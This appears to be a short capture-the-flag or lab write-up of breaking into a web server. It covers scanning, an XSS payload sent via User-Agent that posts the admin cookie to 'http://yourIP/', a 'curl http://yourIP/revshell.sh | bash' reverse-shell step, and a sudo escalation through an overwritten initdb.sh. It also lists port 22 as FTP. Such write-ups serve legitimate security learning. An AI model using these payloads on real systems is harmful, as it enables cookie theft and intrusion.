#xss #command_injection 
### Security Assessment Workflow

1. **Initial Reconnaissance with Nmap**
    
    - Scanned for open services:
        - Port 22: FTP
        - Port 5000: Web service
2. **Discovery of Web Service Vulnerability**
    
    - Conducted directory fuzzing on the web service using tools like Gobuster/Dirbuster.
    - Found a **dashboard** endpoint.
    - Gained **unauthorized access** to the dashboard.
3. **Testing for Cross-Site Scripting (XSS)**
    
    - Exploited message boxes by injecting XSS payloads.
    - Used Burp Suite to craft a malicious User-Agent and inject the following payload:
        
        `<img src=x onerror=fetch('http://yourIP/'+document.cookie);>`
        
    - Successfully retrieved the **admin's cookie**.
4. **Dashboard Exploitation**
    
    - Accessed the dashboard with the stolen admin cookie.
    - Injected code to execute a reverse shell, which worked successfully.
5. **Obtaining Reverse Shell**
    
    - Used Burp Suite to issue a `curl` command that downloaded and executed the reverse shell:
        
        `curl http://yourIP/revshell.sh | bash`
        
    - Successfully gained access to the system as a user.
6. **Privilege Escalation**
    
    - Checked **sudo** permissions using `sudo -l` and found access to `/usr/bin/syscheck`.
    - Inspected `/usr/bin/syscheck` and found it executes the `initdb.sh` file.
7. **Exploitation of syscheck**
    
    - Overwrote the `initdb.sh` file with the following content:
        
        `/bin/bash`
        
    - Granted execution permissions to `initdb.sh`:

        `chmod +x initdb.sh`
        
    - Ran the following command:

        `sudo /usr/bin/syscheck`
        
    - Escalated privileges and obtained **root access**.